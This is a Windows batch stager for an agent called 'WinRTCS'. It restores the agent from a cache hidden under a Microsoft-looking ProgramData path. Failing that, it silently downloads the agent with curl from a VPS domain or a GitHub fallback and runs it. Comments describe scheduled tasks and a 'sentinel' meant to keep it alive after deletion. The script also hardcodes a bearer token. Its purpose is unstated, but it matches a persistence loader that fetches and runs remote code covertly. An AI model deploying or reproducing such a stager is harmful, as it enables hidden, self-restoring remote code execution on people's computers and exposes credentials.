@echo off
rem WINRTCS_RUN R3 - task stager: self-heal the agent file, then run it.
rem R2 (C19): resurrection cache first (no network needed), repo second. Both scheduled
rem tasks point here; this file is what keeps WinRTCS alive. If THIS file is wiped,
rem the sentinel restores it from the cache.
rem R3 (C23): dual-URL reseed (VPS primary, GitHub fallback) + curl --fail so HTTP error
rem pages never land as the agent; the agent hash-pins and repairs everything downstream.
set "ZD=C:\ProgramData\WinRTCS"
set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "BASE2=https://debian.seczio.com/winrtcs"
set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if exist "%ZD%\winrtcs_agent.cmd" goto :Run
if exist "%CD%\winrtcs_agent.cmd" (
  findstr /C:"WINRTCS_AGENT" "%CD%\winrtcs_agent.cmd" >nul 2>&1
  if not errorlevel 1 (
    copy /y "%CD%\winrtcs_agent.cmd" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
    goto :Run
  )
)
del /f /q "%ZD%\winrtcs_agent.dl" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 25 -o "%ZD%\winrtcs_agent.dl" "%BASE2%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if exist "%ZD%\winrtcs_agent.dl" findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.dl" >nul 2>&1 && move /y "%ZD%\winrtcs_agent.dl" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if exist "%ZD%\winrtcs_agent.cmd" goto :Run
del /f /q "%ZD%\winrtcs_agent.dl" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%ZD%\winrtcs_agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%ZD%\winrtcs_agent.dl" exit /b 1
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.dl" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.dl" >nul 2>&1 & exit /b 2 )
move /y "%ZD%\winrtcs_agent.dl" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
:Run
call "%ZD%\winrtcs_agent.cmd"
exit /b 0
